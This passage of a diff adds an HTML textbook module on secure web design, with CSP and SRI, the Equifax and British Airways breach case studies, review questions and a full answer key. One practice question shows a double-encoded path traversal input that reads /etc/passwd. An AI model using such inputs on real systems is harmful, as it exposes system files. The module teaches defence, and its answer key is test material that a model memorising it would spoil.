+  <li><code>object-src 'none'</code>: disables legacy plugin content (Flash, Java applets) entirely, closing an old but still-relevant attack surface.</li>
+  <li><code>frame-ancestors 'none'</code>: prevents the page from being embedded in an <code>&lt;iframe&gt;</code> on another site, mitigating clickjacking.</li>
+</ul>
+
+<div class="prof-note connection">
+  <span class="prof-note-label">Two Controls, Two Different Failure Modes</span>
+  CSP is frequently paired with <span class="annot">Subresource Integrity (SRI)<span class="tip"><strong>Subresource Integrity (SRI)</strong>An HTML attribute that supplies a cryptographic hash of an expected third-party script or stylesheet. The browser computes the hash of what it actually downloaded and refuses to execute it if the hash doesn't match, protecting against a compromised CDN silently serving malicious code. <em>W3C Subresource Integrity specification. Usage: &lt;script src="..." integrity="sha384-..." crossorigin="anonymous"&gt;.</em></span></span>, which cryptographically verifies that a third-party script hasn't been tampered with before executing it. The two controls address different failure modes: CSP restricts <em>which origins</em> may supply active content; SRI verifies that content from an approved origin hasn't been <em>silently altered</em>. The absence of both controls was directly implicated in the 2018 British Airways breach discussed in the case studies below.
+</div>
+
+      </section>
+
+      <section class="textbook-section" id="sec-case">
+        <h3>III. Case Studies: Equifax and British Airways</h3>
+
+<h4>Case Study 5.5.1: The 2017 Equifax Breach, An SDLC and Patch Management Failure</h4>
+<p>In March 2017, the Apache Software Foundation disclosed <span class="annot">CVE-2017-5638<span class="tip"><strong>CVE-2017-5638</strong>A critical remote code execution vulnerability in the Jakarta Multipart parser of Apache Struts 2, allowing an attacker to execute arbitrary operating system commands by crafting a malicious Content-Type HTTP header. <em>CVSS score 10.0 (maximum severity). A patch was released by the Apache Struts project on March 7, 2017, two days before public proof-of-concept exploit code appeared.</em></span></span>, a critical remote code execution flaw in the <span class="annot">Apache Struts<span class="tip"><strong>Apache Struts</strong>An open-source Java web application framework used to build enterprise web applications, handling request routing and form processing. Because it is a widely reused third-party component, a vulnerability in Struts itself simultaneously affects every application built on top of it. <em>Struts vulnerabilities are a recurring pattern in major breaches precisely because organizations frequently fail to track and patch third-party framework dependencies.</em></span></span> web framework, which Equifax used to power an online dispute portal. A patch was available within days. Equifax's internal vulnerability management process, however, failed to identify and patch the affected servers, and the flaw remained exploitable in production for over two months. Attackers exploited the unpatched Struts instance beginning in mid-May 2017, gained a foothold, and moved laterally through inadequately segmented internal networks, eventually exfiltrating the personal data (Social Security numbers, birth dates, addresses, and in some cases driver's license and credit card numbers) of approximately 147 million individuals.</p>
+<p>From the perspective of Secure Web Application Design, the Equifax breach illustrates a failure at the "Response" gate of the SDLC: a working patch existed, but the organization's asset inventory and patch management processes could not reliably identify which systems needed it. Congressional and forensic investigations also identified compounding failures, an expired digital certificate that prevented an internal intrusion-detection tool from decrypting and inspecting traffic for over a year, and insufficient network segmentation that allowed attackers to pivot from the compromised dispute portal into databases containing sensitive personal information unrelated to that portal's function. Equifax ultimately paid a global settlement exceeding $575 million.</p>
+
+<div class="prof-note critical">
+  <span class="prof-note-label">The Lifecycle Does Not End at Release</span>
+  A secure development lifecycle does not end at release. NIST SP 800-218's "Respond to Vulnerabilities" practice group treats ongoing patch management as a first-class SDLC activity, not a separate IT operations concern. Equifax's failure was not a coding defect in the traditional sense, it was a breakdown in the organizational process that should have propagated a known, published, third-party patch into production within days rather than months. Secure-by-design extends to how an organization manages the software supply chain it depends on.
+</div>
+
+<h4>Case Study 5.5.2: The 2018 British Airways Magecart Attack, Missing CSP and Integrity Controls</h4>
+<p>In August–September 2018, attackers affiliated with a threat cluster tracked as <span class="annot">Magecart<span class="tip"><strong>Magecart</strong>A loose collective of threat actor groups that specialize in "web skimming", injecting malicious JavaScript into e-commerce checkout pages to silently capture payment card details as customers type them, then exfiltrate the data to an attacker-controlled server in real time. <em>Named after early campaigns targeting the Magento e-commerce platform. Dozens of distinct Magecart subgroups have been tracked by threat intelligence firms such as RiskIQ and Group-IB.</em></span></span> compromised the British Airways website and mobile application by modifying a JavaScript file loaded by the payment page. The injected script, only 22 lines of code, silently captured customer name, address, and full payment card details (including the CVV) as they were typed into the legitimate checkout form, and transmitted that data in real time to a server registered by the attackers using a domain designed to resemble a legitimate British Airways asset. Because the skimming script executed within the trusted context of the airline's own domain, standard payment-security controls like TLS and PCI-DSS network segmentation provided no protection, the theft happened entirely client-side, inside the victim's own browser, before the card data ever reached British Airways' servers.</p>
+<p>Approximately 380,000 customer payment transactions were affected. The UK Information Commissioner's Office (ICO) fined British Airways £20 million under the <span class="annot">General Data Protection Regulation (GDPR)<span class="tip"><strong>GDPR, General Data Protection Regulation</strong>A European Union regulation governing the collection and processing of personal data, imposing strict breach-notification requirements and fines of up to 4% of global annual revenue for serious violations. <em>Regulation (EU) 2016/679, in force since May 2018. The British Airways fine was later reduced from an initial proposed £183 million, partly in consideration of the COVID-19 pandemic's economic impact on the airline industry.</em></span></span>, one of the largest penalties issued under the regulation at the time, citing, among other findings, inadequate security testing and insufficient controls over third-party scripts loaded on the payment page.</p>
+<p>This incident is the textbook argument for the CSP and Subresource Integrity controls discussed in Section II. A properly scoped <code>script-src</code> directive would have prevented the browser from executing a script injected from, or exfiltrating data to, a domain not on the airline's explicit allowlist. SRI hashing on every first-party script would have caused the browser to reject the tampered file the instant its content diverged from the expected cryptographic hash. Neither control was in place, and the compromise went undetected for approximately two weeks.</p>
+
+<div class="prof-note">
+  <span class="prof-note-label">The Browser Is Part of the Attack Surface You Own</span>
+  Students sometimes assume "the server" is the only place trust boundaries need defending. The British Airways case shows that a script running inside a customer's own browser, on the airline's own domain, is still crossing a trust boundary, the boundary between "code the organization wrote and reviewed" and "code an attacker silently modified." Secure Web Application Design has to account for supply-chain and client-side integrity, not just server-side input handling.
+</div>
+
+<h4>DevSecOps as a Positive Counter-Example</h4>
+<p>Organizations that have successfully shifted security left, embedding SAST scanning directly into CI/CD pipelines, requiring peer review of every pull request against a secure coding checklist, and running automated dependency-vulnerability scanning (Software Composition Analysis) on every build, report dramatically shorter mean time-to-remediate for newly discovered flaws, often catching classes of vulnerabilities like reflected input handling (the exact scenario referenced in this topic's Allsafe incident-response case, where a SAST alert flagged "Insecure input reflection on page profile.php") before code ever reaches a production branch. This is the practical realization of the SDLC's Verification gate: automated compiler and static-analysis rule checks act as a continuously running, low-cost proxy for the manual code review that does not scale across thousands of daily commits.</p>
+
+      </section>
+
+      <section class="textbook-section" id="sec-protection">
+        <h3>IV. Secure Development Standards: Validation, Encoding, Defaults, Verification</h3>
+
+<p>Organizations formalize secure web application design through layered technical, procedural, and organizational controls:</p>
+
+<h4>1. Input Validation and Server-Side Enforcement</h4>
+<p>All validation logic must execute on the server, regardless of what client-side checks exist for user experience purposes, since browser-based JavaScript validation is trivially bypassed by direct API calls. Validation should default to allowlisting known-good formats, and all decoding/canonicalization must occur before validation logic runs, closing the canonicalization bypass class described in Section II.</p>
+
+<h4>2. Context-Aware Output Encoding at Every Rendering Boundary</h4>
+<p>Every point where untrusted data is written into a response, HTML body, HTML attribute, JavaScript context, URL, or CSS, must apply the encoding function specific to that context. Modern web frameworks (React, Angular, Django templates) apply HTML-context encoding automatically by default, which is itself an application of the secure-by-default principle; developers must actively opt out (e.g., React's <code>dangerouslySetInnerHTML</code>) to reintroduce risk, making the unsafe path visibly deliberate rather than an easy accidental default.</p>
+
+<h4>3. Parameterized Data Access as an Architectural Standard</h4>
+<p>Organizations enforce parameterized queries through code review gates and SAST rules that flag any direct string concatenation feeding into a database driver's execute method, regardless of whether the specific input appears attacker-controlled, treating the pattern itself, not just demonstrated exploitability, as the defect.</p>
+
+<h4>4. Secure Defaults and Configuration Baselines</h4>
+<p>Systems should be provisioned from a hardened configuration baseline (e.g., CIS Benchmarks) that disables unused services, removes default credentials, enforces least-privilege file and database permissions, and fails closed on ambiguous authorization decisions. <span class="annot">HTTP Strict Transport Security (HSTS)<span class="tip"><strong>HSTS, HTTP Strict Transport Security</strong>A response header instructing browsers to only ever connect to a site over HTTPS, even if the user types "http://" or clicks an unencrypted link, for a specified duration. Prevents downgrade and man-in-the-middle interception of what should be an encrypted session. <em>RFC 6797. Directly referenced in this topic's study guide decision framework: "If external public networks sniff client session headers → Enforce HTTPS HSTS and VPN tunnels."</em></span></span> should be enabled by default for any application handling authentication or sensitive data.</p>
+
+<h4>5. Compliance-Driven Verification Standards</h4>
+<p>The <span class="annot">OWASP Application Security Verification Standard (ASVS)<span class="tip"><strong>OWASP ASVS</strong>A structured checklist of security requirements and verification tests organized into three increasing levels of rigor, used by organizations to define and audit against a target application security posture. <em>ASVS v4.0.3 organizes requirements into 14 categories including V5 (Validation, Sanitization and Encoding) and V9 (Communications).</em></span></span> and the <span class="annot">OWASP Software Assurance Maturity Model (SAMM)<span class="tip"><strong>OWASP SAMM</strong>A maturity model that helps organizations assess and improve their software security practices across five business functions: Governance, Design, Implementation, Verification, and Operations. Unlike ASVS (which audits a specific application), SAMM assesses the maturity of an organization's overall software security program. <em>OWASP SAMM v2 is the current major version.</em></span></span> give organizations a structured way to measure and mature their SDLC practices over time, rather than treating secure design as a one-time certification.</p>
+
+<div class="prof-note exam-focus">
+  <span class="prof-note-label">Architectural, Procedural and Runtime Controls Do Different Work</span>
+  A serious answer to "how do we prevent injection" names three controls that fail independently. The <em>architectural</em> control, parameterised queries, context-aware output encoding, removes the vulnerability class from the code, and is the only one of the three that actually fixes anything. The <em>procedural</em> control, static and dynamic analysis gates, dependency scanning, review checklists, catches the cases where a developer bypassed the architectural control, deliberately or otherwise, and does so before release. The <em>runtime</em> control, a strict Content-Security-Policy, a web application firewall, a database account with read-only rights on the tables it does not need to write, reduces what an attacker gains from the instance that slipped through both. Only the first is a fix; the other two exist because the first is never applied everywhere.
+</div>
+
+      </section>
+
+      <section class="textbook-section" id="sec-bibliography">
+        <h3>V. References and Further Reading</h3>
+        <ol class='bibliography-list' style='padding-left: 20px; font-size: 15px; color: var(--text-muted);'><li style='margin-bottom: 12px; text-align: justify;'>OWASP Foundation. (2021). OWASP Top 10, 2021: The Ten Most Critical Web Application Security Risks.</li><li style='margin-bottom: 12px; text-align: justify;'>OWASP Foundation. Application Security Verification Standard (ASVS) v4.0.3.</li><li style='margin-bottom: 12px; text-align: justify;'>OWASP Foundation. Software Assurance Maturity Model (SAMM) v2.</li><li style='margin-bottom: 12px; text-align: justify;'>National Institute of Standards and Technology. (2022). NIST Special Publication 800-218: Secure Software Development Framework (SSDF) Version 1.1.</li><li style='margin-bottom: 12px; text-align: justify;'>National Institute of Standards and Technology. NIST Special Publication 800-64 Rev. 2: Security Considerations in the System Development Life Cycle.</li><li style='margin-bottom: 12px; text-align: justify;'>Cybersecurity and Infrastructure Security Agency. (2023). Secure by Design: Shifting the Balance of Cybersecurity Risk.</li><li style='margin-bottom: 12px; text-align: justify;'>Cybersecurity and Infrastructure Security Agency &amp; National Security Agency. (2023). Secure by Design and Default Principles and Approaches Joint Guidance.</li><li style='margin-bottom: 12px; text-align: justify;'>World Wide Web Consortium. Content Security Policy Level 3 (W3C Working Draft).</li><li style='margin-bottom: 12px; text-align: justify;'>World Wide Web Consortium. Subresource Integrity (W3C Recommendation).</li><li style='margin-bottom: 12px; text-align: justify;'>United States Government Accountability Office. (2018). GAO-18-559: Data Protection, Actions Taken by Equifax and Federal Agencies in Response to the 2017 Breach.</li><li style='margin-bottom: 12px; text-align: justify;'>Information Commissioner's Office (UK). (2020). Monetary Penalty Notice: British Airways.</li></ol>
+      </section>
+    </div>
+  </article>
+
+  <section class="review-questions">
+    <h3>Self-Check Review Questions</h3>
+    <div class="question-block">
+      <div class="question-header">Question 1: Explain why parameterized queries (prepared statements) eliminate SQL injection as a vulnerability class, whereas input sanitization or character escaping alone does not provide the same guarantee.</div>
+      <button class="reveal-solution-btn" onclick="toggleSolution(1)">Toggle Answer</button>
+      <div class="solution-content" id="sol-1"><p>Parameterized queries separate the structure of a SQL statement from its data at the database protocol level. The application sends the query template, containing fixed placeholders, to the database first; the database compiles and fixes the query's logical structure before any user-supplied values are transmitted. Values are then bound to the placeholders strictly as data, meaning the database engine can never reinterpret them as SQL syntax, regardless of what characters (quotes, semicolons, comment sequences) they contain.
+
+Input sanitization and character escaping, by contrast, operate as a denylist-style patch applied to a fundamentally unsafe pattern: string concatenation of untrusted data directly into a command string that is later parsed as executable syntax. Escaping requires the defender to correctly anticipate every character sequence, encoding, and database-specific syntax quirk (such as differing comment syntax across MySQL, PostgreSQL, and MSSQL) that could be used to break out of the intended data context, an incomplete and error-prone exercise. Parameterization removes the ambiguity structurally rather than relying on completeness of a filter, which is why it is the architecturally preferred defense over sanitization alone.</p></div>
+    </div>
+    <div class="question-block">
+      <div class="question-header">Question 2: A security team discovers a web page that reflects a URL query parameter directly into the HTML response without encoding, allowing an attacker to inject a script tag (as flagged by the SAST alert "Insecure input reflection on page profile.php"). Describe the specific technical control that remediates this finding and explain why context-aware encoding is necessary rather than a single universal encoding function.</div>
+      <button class="reveal-solution-btn" onclick="toggleSolution(2)">Toggle Answer</button>
+      <div class="solution-content" id="sol-2"><p>The remediation is context-aware output encoding applied at the point where the untrusted data is written into the HTML response. For data reflected directly into the HTML body, characters with special meaning to the HTML parser, particularly &lt;, &gt;, &amp;, and quote characters, must be converted to their corresponding HTML entities (e.g., &lt; becomes &amp;lt;) so that an injected &lt;script&gt; tag is rendered by the browser as inert, visible text rather than parsed and executed as markup.
+
+A single universal encoding function is insufficient because different output contexts treat different characters as syntactically significant. A character sequence that is dangerous inside an HTML body (such as an unencoded angle bracket) is not the primary danger inside a JavaScript string literal (where an unescaped quote or backslash allows an attacker to terminate the string and inject new script statements) or inside a URL (where reserved characters can alter the destination or query structure). Applying HTML-entity encoding to data destined for a JavaScript context, or vice versa, does not neutralize the syntax that is actually dangerous in that specific context, so the encoding function selected must match the exact output context in which the data will be rendered.</p></div>
+    </div>
+    <div class="question-block">
+      <div class="question-header">Question 3: Using the 2018 British Airways Magecart incident as a reference point, explain how a Content-Security-Policy header combined with Subresource Integrity would have functioned as a defense-in-depth layer even if the attacker had already succeeded in modifying a first-party JavaScript file.</div>
+      <button class="reveal-solution-btn" onclick="toggleSolution(3)">Toggle Answer</button>
+      <div class="solution-content" id="sol-3"><p>In the British Airways incident, attackers modified a JavaScript file served from the airline's own trusted domain and used it to capture customer payment card data client-side, then transmit that data to an attacker-controlled exfiltration server. Because the malicious script executed within the legitimate site's origin, transport-layer protections such as TLS provided no defense, the compromise occurred entirely within the trusted execution context of the victim's own browser session.
+
+A properly scoped Content-Security-Policy script-src and connect-src directive would have functioned as an independent defense-in-depth layer at the browser level: even though the tampered script originated from an allowed first-party path, a CSP configured with a restrictive connect-src (limiting which network destinations the page is permitted to send data to) would have blocked the browser from transmitting captured card data to an unlisted, attacker-controlled exfiltration domain, since that destination was never present in the organization's approved allowlist.
+
+Subresource Integrity would have addressed the initial tampering itself: had the legitimate script tag included an integrity attribute with the cryptographic hash of the authentic, unmodified file, the browser would have computed the hash of the actually-downloaded (tampered) script, detected the mismatch against the expected value, and refused to execute the file at all, preventing the malicious code from running in the first place, independent of any CSP restriction on where data could later be sent. Together, these two controls illustrate defense-in-depth: SRI prevents execution of tampered code, and CSP limits the damage even if tampered code executes anyway.</p></div>
+    </div>
+  </section>
+
+  <section class="review-questions">
+    <h3>Practice Questions</h3>
+
+    <div class="question-block">
+      <div class="question-header">Question 1 <span class="ap-code">5.5.A</span>, A router ships with TLS management enabled, audit logging on, no factory administrative password, and a first-boot flow that forces credential creation. Its firmware, however, parses configuration files in unaudited C with no bounds checking. Which characterization is correct?</div>
+      <ol type="A">
+        <li>The product is both secure by design and secure by default, since the shipped configuration is hardened.</li>
+        <li>The product is secure by default but not secure by design: the out-of-the-box state is the safe one, while an architectural decision, parsing untrusted input in a memory-unsafe language without bounds checking, leaves a defect class that no configuration setting can close.</li>
+        <li>The product is secure by design but not secure by default, since no default password is a design property.</li>
+        <li>The two principles are the same thing, so the product satisfies both or neither.</li>
+      </ol>
+    </div>
+
+    <div class="question-block">
+      <div class="question-header">Question 2 <span class="ap-code">5.5.B</span>, A checkout page validates a quantity field in JavaScript, rejecting anything that is not a positive integer, and the server multiplies the submitted quantity by a price also submitted by the form. An attacker submits a quantity of <code>-3</code> and a price of <code>0.01</code>. What went wrong?</div>
+      <ol type="A">
+        <li>The JavaScript validator has a logic bug and should also reject negative numbers.</li>
+        <li>Two failures compound: the only validation runs in a place the attacker controls and can simply be skipped by issuing the request directly, and the server treats a price supplied by the client as authoritative rather than looking it up server-side. Every value a security or financial decision depends on must be validated and recomputed on the server.</li>
+        <li>Nothing went wrong, since a negative quantity will be caught by the payment processor.</li>
+        <li>The page needed a denylist that blocks the minus character in numeric fields.</li>
+      </ol>
+    </div>
+
+    <div class="question-block">
+      <div class="question-header">Question 3 <span class="ap-code">5.5.B</span>, A filter rejects any request containing the literal string <code>../</code>. A tester retrieves <code>/etc/passwd</code> anyway by submitting <code>%252e%252e%252f</code>. What does this demonstrate, and what is the correct fix?</div>
+      <ol type="A">
+        <li>The filter's regular expression was case-sensitive; making it case-insensitive resolves the bypass.</li>
+        <li>The web server is misconfigured to serve system files, and the filter itself is sound.</li>
+        <li>The value was validated before it reached its canonical form, a double-encoded sequence that the stack decodes twice, so the forbidden string materialises after the check. The structural fix is to decode and normalise exactly once, validate the canonical value, and better still to accept an opaque identifier mapped to a filename through a server-side table so that no path is ever taken from the request.</li>
+        <li>The application should reject all requests containing a percent sign.</li>
+      </ol>
+    </div>
+
+    <div class="question-block">
+      <div class="question-header">Question 4 <span class="ap-code">5.5.B</span>, A team parameterises every query, then needs to let users sort a report by a column they choose from a dropdown. The developer writes <code>ORDER BY %s</code> and binds the column name. The query fails. What is the correct approach?</div>
+      <ol type="A">
+        <li>Concatenate the column name after escaping any quote characters in it.</li>
+        <li>A placeholder binds a value, and a column name is syntax rather than a value, so binding cannot work here. Map the user's selection through a fixed server-side allowlist of permitted column names and interpolate only the matched constant, rejecting anything unmatched.</li>
+        <li>Switch the whole query back to concatenation, since parameterisation is incompatible with dynamic sorting.</li>
+        <li>Bind the column name as a value but wrap it in double quotes first.</li>
+      </ol>
+    </div>
+
+    <div class="question-block">
+      <div class="question-header">Question 5 <span class="ap-code">5.5.A</span>, A pipeline runs static analysis on every pull request. A finding of unencoded reflection reaches production anyway, in a template that reads a value from a request header the scanner did not model as untrusted. Which addition to the Verification gate would most directly have caught it?</div>
+      <ol type="A">
+        <li>Increasing the static analyser's severity threshold so more findings are reported.</li>
+        <li>A dynamic or interactive test against a deployed build, which exercises the running application from the outside and observes what the template actually emits, the class of defect static analysis structurally cannot see when its source model is incomplete.</li>
+        <li>Software composition analysis, which would have flagged the vulnerable template engine.</li>
+        <li>Nothing; a finding that escapes static analysis is by definition not detectable before release.</li>
+      </ol>
+    </div>
+
+    <div class="question-block">
+      <div class="question-header">Question 6 <span class="ap-code">5.5.A</span> <span class="ap-code">5.5.B</span>, After a skimming incident, a retailer adds a strict <code>script-src</code> policy. A reviewer argues this makes output encoding unnecessary. Which response is best?</div>
+      <ol type="A">
+        <li>The reviewer is right: a browser-enforced allowlist prevents any injected script from running, so encoding is redundant.</li>
+        <li>The reviewer is wrong: a Content-Security-Policy is a compensating layer that limits what an injected script may do, while encoding prevents the injection from becoming script at all. Policies are also routinely weakened in practice by permissive sources, and dropping the primary control to rely on the secondary one inverts the order of defence.</li>
+        <li>The reviewer is right provided the policy also includes <code>frame-ancestors 'none'</code>.</li>
+        <li>The reviewer is wrong because a Content-Security-Policy applies only to third-party scripts and never to inline ones.</li>
+      </ol>
+    </div>
+
+    <div class="question-block">
+      <div class="question-header">Free Response 1 <span class="ap-code">5.5.B</span>, A support portal lets users upload a profile photograph and displays the filename beneath it. The filename is stored as submitted and rendered into the page. Describe every place untrusted data crosses a boundary in this feature, the defence appropriate to each crossing, and explain why input validation alone cannot secure it.</div>
+    </div>
+
+    <div class="question-block">
+      <div class="question-header">Free Response 2 <span class="ap-code">5.5.A</span>, You are asked to make a five-year-old internal application "secure by design and secure by default" before it is exposed to the public internet. Distinguish the two goals, give three concrete changes under each, and explain which of your six changes could still be undone by a customer or administrator and what that implies about how you would verify the work.</div>
+    </div>
+
+  </section>
+
+  <section class="answer-key">
+    <h3>Answer Key</h3>
+
+    <div class="key-item">
+      <span class="key-q">1. B</span><span class="key-lo">5.5.A</span>
+      <p class="key-why">The distinction is exactly the one the objective asks for. Secure by default describes the shipped state, and this product's shipped state is genuinely good: forced credential creation, transport encryption, and logging all on. Secure by design describes decisions taken during architecture, and parsing attacker-supplied configuration in unaudited C without bounds checking is an architectural decision that admits memory corruption regardless of any switch an administrator sets. <strong>A</strong> collapses the two and credits configuration for an architectural property. <strong>C</strong> reverses the labels; the absence of a default password is a property of the shipped configuration, not of the design. <strong>D</strong> denies the distinction the question exists to test, and the counterexamples run in both directions.</p>
+    </div>
+
+    <div class="key-item">
+      <span class="key-q">2. B</span><span class="key-lo">5.5.B</span>
+      <p class="key-why">Two independent defects, and the second is the worse one. Client-side validation is a usability feature, because the attacker composes the request and can omit the page entirely; nothing about improving that validator changes the outcome. The deeper failure is trusting the client with a value the server should own: a price belongs in the catalogue, looked up by product identifier at the moment of calculation, and a quantity must be re-validated against a server-side rule. The general form is that any value the server does not recompute has been decided by the client. <strong>A</strong> proposes to repair code the attacker never runs. <strong>C</strong> outsources an authorization decision to a downstream party who has no idea what the item should cost. <strong>D</strong> reaches for a denylist and would in any case be applied in the same place the attacker skips.</p>
+    </div>
+
+    <div class="key-item">
+      <span class="key-q">3. C</span><span class="key-lo">5.5.B</span>
+      <p class="key-why">This is the canonicalization failure stated precisely: <code>%252e</code> decodes to <code>%2e</code> and then to <code>.</code>, so the dangerous string exists only after the filter has run. The lesson is about ordering rather than about the pattern, any denylist checked before normalisation is checking a string the application will not ultimately act on. The durable answer removes the path from the request entirely, mapping an opaque identifier to a filename server-side, with canonicalise-then-verify-under-base-directory as the fallback where a path genuinely must be accepted. <strong>A</strong> addresses a bypass the scenario does not use. <strong>B</strong> misplaces the defect: the server is serving a file the application asked it for. <strong>D</strong> would break every legitimate encoded request and still fail against the next alternate representation.</p>
+    </div>
+
+    <div class="key-item">
+      <span class="key-q">4. B</span><span class="key-lo">5.5.B</span>
+      <p class="key-why">Placeholders bind values, and the database plans the statement before values exist, so a placeholder cannot occupy a position where the grammar requires an identifier. That is a limit of parameterisation and worth knowing precisely, because it is the one place the standard advice does not apply. The correct substitute preserves the principle: the user selects an index into a set the server defines, and the server interpolates its own constant, so no attacker-supplied text ever reaches the statement. <strong>A</strong> returns to concatenation with an escaping patch, and an identifier position is not a string literal, so quote handling is irrelevant to it. <strong>C</strong> abandons a sound control across the whole query for one clause. <strong>D</strong> misunderstands binding; quoting a bound value does not change what the placeholder can occupy.</p>
+    </div>
+
+    <div class="key-item">
+      <span class="key-q">5. B</span><span class="key-lo">5.5.A</span>
+      <p class="key-why">Every analysis technique has a structural blind spot, and the failure described is squarely inside the static analyser's: its source model omitted a header, so the flow was never traced. Dynamic and interactive testing do not depend on that model, because they observe a running instance, the dynamic scanner from outside, the interactive agent from within the runtime, which is why a mature Verification gate runs more than one instrument. <strong>A</strong> tunes the noise level of a tool that never produced the finding. <strong>C</strong> names a control aimed at third-party dependency advisories, which is a different defect class entirely. <strong>D</strong> is the counsel of despair and is refuted by the ordinary practice of layering test techniques.</p>
+    </div>
+
+    <div class="key-item">
+      <span class="key-q">6. B</span><span class="key-lo">5.5.A, 5.5.B</span>
+      <p class="key-why">The order of defences matters. Encoding prevents untrusted data from being parsed as markup, which is a fix; a Content-Security-Policy constrains what a script may do once one exists, which is containment. Containment is valuable precisely because fixes are unevenly applied, but substituting it for the fix leaves the application relying on a header that empirical surveys repeatedly find weakened in production by permissive sources and by allowlisted hosts that turn out to serve script-gadget libraries. <strong>A</strong> states the misconception. <strong>C</strong> adds a clickjacking control that has no bearing on script execution. <strong>D</strong> is factually wrong, and inverts the truth: restricting inline script is among the policy's most important effects.</p>
+    </div>
+
+    <div class="key-item">
+      <span class="key-q">FR 1</span><span class="key-lo">5.5.B</span>
+      <p class="key-why"><strong>Model response.</strong> The filename crosses at least four boundaries, and a different control applies at each. At <em>intake</em>, the value is attacker-controlled text arriving over HTTP; the server validates it against an allowlist, a bounded length, a permitted character set, an extension drawn from a fixed list, after decoding it exactly once, and validates the file's actual content type rather than trusting the extension or the declared type. At the <em>filesystem</em> boundary, the submitted name must not be used as a path: the file is stored under a server-generated identifier, with the original name kept only as metadata, which removes path traversal, name collision, and reserved-name problems together. At the <em>database</em> boundary, the name is stored through a parameterised statement, so no quotation mark it contains can reach the grammar. At the <em>rendering</em> boundary, the name is emitted with the encoding appropriate to its context: HTML-entity encoding if it lands in the page body, attribute encoding if it lands in an attribute, and a scheme allowlist if any part of it becomes a URL. A fifth boundary is worth naming: the file is served back to browsers, so it needs a correct <code>Content-Type</code>, <code>X-Content-Type-Options: nosniff</code>, and ideally a separate origin, so that an uploaded file cannot execute as script in the application's own origin. Validation alone cannot secure this because a legitimate filename may contain an apostrophe, and because the same accepted value is subsequently interpreted by four different interpreters with four different notions of dangerous syntax; a check at the entrance cannot know which exit the value will take. <em>Grader look-fors:</em> at least four distinct crossings identified; a control matched to each rather than one control applied everywhere; storage under a generated name rather than a submitted path; explicit statement that a valid value can still be dangerous downstream; context-dependence of the encoding.</p>
+    </div>
+
+    <div class="key-item">
+      <span class="key-q">FR 2</span><span class="key-lo">5.5.A</span>
+      <p class="key-why"><strong>Model response.</strong> The two goals differ in when the decision is made and in who can reverse it. Secure by design concerns architecture and is expressed in code; secure by default concerns the shipped configuration and is expressed in settings. Three design changes: replace every concatenated statement with parameterised access and add a build rule that fails on the concatenation pattern, so the class cannot reappear; re-derive authorization from the session inside each object-addressed handler rather than trusting an identifier in the route, eliminating the direct-object-reference class; and move all rendering into a template engine that encodes by context automatically, so an unencoded emission requires an explicit and visible opt-out. Three default changes: remove the seeded administrative account and require credential creation on first run; enable audit logging and multi-factor authentication in the shipped configuration rather than offering them; and set the deployment to fail closed, deny on an unreachable authorization service, expire sessions, disable directory listing and verbose errors, with HSTS and a strict Content-Security-Policy served by default. The asymmetry is the point of the last part: all three default changes can be reversed by an administrator, and in a long-lived deployment some of them will be, whereas the design changes cannot be undone from a configuration file. Verification therefore differs in kind. Design changes are verified once and then guarded continuously by a build rule and by static analysis, so a regression fails the pipeline. Default changes are verified against the deployed instance and must be re-verified continuously, by configuration baseline scanning and by dynamic testing of production and staging, because the artefact that drifts is the environment rather than the source. <em>Grader look-fors:</em> a clear statement of the distinction before the examples; three plausible and concrete items under each heading, not restatements of the principle; recognition that configuration drifts while architecture does not; a verification method matched to each kind, with continuous re-verification proposed for the configuration side.</p>
+    </div>
+
+  </section>
+
+  <footer class="footnote-block">
+    <p>This reading module serves as an advanced academic and research reference. All cited works, specifications, and guidance frameworks are credited in the bibliography section above.</p>
+  </footer>
+</div>
+
+<nav class="topic-pager">
+  <a class="prev" href="../5.4/notes.html"><span class="pager-label">Previous</span>&larr; Asymmetric Cryptography</a>
+  <a class="next" href="../5.6/notes.html"><span class="pager-label">Next</span>Detecting Attacks on Data and Applications &rarr;</a>
+</nav>
+
+
+<aside class="notes-sidebar collapsed" id="notesSidebar">
+  <button class="notes-sidebar-tab" id="notesSidebarTab">Notes</button>
+  <div class="notes-sidebar-header">
+    <h4>Notes</h4>
+    <button class="notes-sidebar-close" id="notesSidebarClose">&times;</button>
+  </div>
+  <div class="notes-sidebar-body">
+    <h5>Professor's Notes</h5>
+    <div id="sideProfNoteList"></div>
+    <h5>Your Highlights</h5>
+    <p style="font-size:11px;color:var(--text-muted);margin:0 0 10px 0;">Select any text in the chapter to highlight it.</p>
+    <div class="side-highlight-list" id="sideHighlightList"></div>
+    <h5>Your Notes</h5>
+    <textarea id="userNotesInput" placeholder="Write your own notes on this page here..."></textarea>
+    <div class="notes-save-status" id="notesSaveStatus"></div>
+  </div>
+</aside>
+
+<script src="../../assets/notes/reader.js"></script>
+<script src="../../assets/notes/sidebar-notes.js"></script>
+</body>
+</html>
